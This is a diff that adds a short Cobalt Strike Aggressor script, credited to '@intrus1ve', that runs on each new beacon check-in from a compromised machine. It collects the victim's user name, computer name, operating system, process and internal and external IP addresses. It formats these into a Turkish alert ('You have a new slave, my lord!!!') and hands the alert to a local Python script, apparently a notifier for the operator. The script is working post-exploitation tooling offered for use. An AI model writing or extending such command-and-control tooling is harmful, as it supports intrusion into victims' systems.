@@ -1,0 +1,28 @@
+# Author @intrus1ve
+
+$pyScript = "/root/Desktop/pyScript.py";
+
+on beacon_initial {
+	$userName = beacon_info($1, "user");
+        $computerName = beacon_info($1, "computer");
+	$operatingSystem = beacon_info($1, "os");
+	$architecture = beacon_info($1, "arch");
+	$buildVersion = beacon_info($1, "build");
+        $inIP = beacon_info($1, "internal");
+        $exIP = beacon_info($1, "external");
+	$processName = beacon_info($1, "process");
+
+
+	$infoText_Tr = "-----------------------------------------------------------
+Bi Köleniz Var Lordum!!!
+Kullanıcı Adı: $userName
+Bilgisayar Adı: $computerName
+İşletim Sistemi: $operatingSystem $architecture $buildVersion
+İşlem Adı: $processName
+İç IP: $inIP
+Dış IP: $exIP
+-----------------------------------------------------------";
+
+	@command = @('python3',$pyScript,$infoText_Tr);
+	exec(@command);
+}
